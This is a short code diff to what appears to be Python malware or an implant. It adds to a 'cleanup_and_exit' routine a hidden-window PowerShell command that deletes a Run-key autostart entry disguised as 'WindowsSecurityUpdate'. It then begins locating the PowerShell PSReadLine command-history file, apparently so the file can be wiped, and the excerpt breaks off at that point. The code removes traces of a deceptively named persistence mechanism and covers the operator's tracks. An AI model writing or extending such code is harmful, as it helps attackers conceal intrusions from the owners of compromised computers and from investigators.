@@ -65,6 +65,15 @@ async def watchdog():
 
 def cleanup_and_exit():
 
+    ps_cmd_persistence = (
+        "Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
+        "-Name 'WindowsSecurityUpdate' -ErrorAction SilentlyContinue"
+    )
+    subprocess.Popen(
+        ["powershell", "-NoProfile", "-Command", ps_cmd_persistence],
+        creationflags=subprocess.CREATE_NO_WINDOW,
+    )
+
     ps_history = os.path.join(
         os.environ.get("APPDATA", ""),
         "Microsoft", "Windows", "PowerShell", "PSReadLine",
